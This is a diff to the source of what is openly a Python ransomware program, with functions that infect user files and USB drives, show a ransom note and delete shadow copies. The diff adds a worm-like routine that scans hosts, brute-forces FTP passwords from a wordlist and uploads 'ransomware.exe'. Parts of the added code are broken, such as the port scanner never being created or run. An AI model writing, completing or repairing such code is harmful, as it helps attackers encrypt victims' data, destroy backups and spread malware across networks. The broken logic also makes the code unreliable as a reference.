@@ -6,6 +6,7 @@ import stat
 import time
 
 import sys
+import nmap
 import win32gui
 from cryptography.fernet import Fernet
 
@@ -24,6 +25,7 @@ targets = ('.txt', '.docx', '.doc', '.lnk',
 
 
 def virus_property():
+    # Infect files in current user
     user = getpass.getuser()
     target = ('txt', '.pdf', '.png', '.exe')
     path = 'C:/Users/' + user + '/'
@@ -49,6 +51,7 @@ def virus_property():
 
 
 def usb_infection():
+    # Infect Thumb drives In F:// drive
     target = ('txt', '.pdf', '.png', '.exe')
     path = 'F:\\'
     try:
@@ -144,6 +147,29 @@ def show_ransom_note():
         count += 1
         if count == 2:
             break
+
+
+def ftp_spread():
+    # Spread through ftp
+    nm = nmap.PortScanner
+    hosts = nm.all_hosts()
+    password = open('wordlist.txt', 'r+').read().split('\n')
+    for host in hosts:
+        try:
+            subprocess.run(f'ftp -A {host}', shell=True)
+        except Exception:
+            pass
+        else:
+            for pw in password:
+                try:
+                    subprocess.run(f'user {pw}', shell=True)
+                except Exception:
+                    pass
+                else:
+                    subprocess.run('binary', shell=True)
+                    subprocess.run('put ransomware.exe', shell=True)
+                    subprocess.run('quit', shell=True)
+                    break
 
 
 def dlt_shadow_copy():
